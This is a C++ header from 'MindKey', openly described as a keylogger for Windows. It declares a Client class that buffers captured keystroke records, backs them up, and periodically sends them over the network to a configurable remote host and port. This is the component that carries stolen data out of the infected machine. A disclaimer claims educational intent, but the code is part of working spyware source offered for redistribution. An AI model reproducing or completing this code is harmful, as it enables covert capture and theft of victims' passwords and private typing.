/* MindKey, Keylogger for Windows. 
 * While this program can potentially be used for nefarious purposes, 
 * it was written for educational and recreational purposes only
 * and the author does not endorse illegal use.
 *
 * Copyright (C) 2013 Blackhack <https://github.com/blackhack/MindKey/>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#ifndef MINDKEY_SENDER_H
#define MINDKEY_SENDER_H

#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/lexical_cast.hpp>
#include <boost/thread/thread.hpp>
#include <boost\thread\mutex.hpp>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <Psapi.h>
#include <connection.h>
#include <boost/serialization/vector.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>
#include <dataStruct.h>

#define NEXT_WRITE_TIME 300 // In Seconds

class Client
{
public:
    Client(boost::asio::io_service& io_service, std::string host, std::string port) : _connection(io_service)
    {
        _host = host;
        _port = port;
    }

    void StartSendOperations();
    void HandleConnect(const boost::system::error_code& e);
    void HandleWrite(const boost::system::error_code& e);

    void BackupKeyBuffer();
    void RestoreKeyBuffer();
    size_t GetSizeBuffer() { return _stocks.size(); }
    void AddKeyInfo(KeyDataStruct info);

private:
    connection _connection;
    std::string _host;
    std::string _port;

    std::vector<KeyDataStruct> _stocks;
    std::vector<KeyDataStruct> _stocksBackup;
    boost::mutex _keysBufferLock;
};

#endif //MINDKEY_SENDER_H
